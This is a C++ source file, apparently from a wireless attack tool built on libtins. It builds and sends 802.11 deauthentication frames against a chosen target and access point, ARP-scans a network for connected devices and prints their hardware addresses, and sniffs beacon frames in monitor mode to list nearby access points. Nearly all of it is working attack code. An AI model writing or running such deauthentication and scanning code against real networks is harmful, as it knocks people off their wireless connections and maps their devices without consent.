#include <codecvt>
#include <zconf.h>
#include <thread>
#include <boost/algorithm/string.hpp>
#include "../include/network.hpp"

using namespace Tins;

network::network()	{
	iface_name = "wlan0";
	deauth_packet = Dot11Deauthentication(target, bssid);	//set target/sender
	deauth_packet.addr3(bssid);	//set the BSSID
	deauth_packet.reason_code(0x007);	//From airplay-ng
	radio = RadioTap() / deauth_packet;
}

network::~network()	{
}

void network::send_deauth()	{
	sender.send(radio, iface_name);
}

std::vector<std::wstring> network::get_interfaces()	{
	std::vector<std::wstring> interface_names;
	std::vector<NetworkInterface> interfaces = NetworkInterface::all();
	for(const NetworkInterface& iface : interfaces)	{
		interface_names.push_back(iface.friendly_name());
	}

	return interface_names;
}

std::vector<std::string> network::get_connected_devices()	{
	std::vector<std::string> targets;
	NetworkInterface iface = NetworkInterface(iface_name);
	NetworkInterface::Info info_scanner = iface.info();

	for(const auto &target : network_range)	{
		EthernetII scan = ARP::make_arp_request(target, info_scanner.ip_addr, info_scanner.hw_addr);
		std::unique_ptr<PDU> reply(sender.send_recv(scan, iface));
		if(reply)	{
			targets.push_back((reply->rfind_pdu<ARP>()).sender_hw_addr().to_string());
			std::cout << "Target found : [" << target << " / " << targets.back() << " ]" << std::endl;
		}
	}

	return targets;
}

std::map<std::string, std::set<address_type> > network::get_access_points()	{
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	config.set_filter("type mgt subtype beacon");
	config.set_rfmon(true);

	Sniffer sniffer(iface_name, config);
	std::thread scanThread(&Network::stopScan, &scanning);
	scanThread.detach();

	sniffer.sniff_loop(make_sniffer_handler(this, &Network::scanCallback));

	return accessPoints;
}

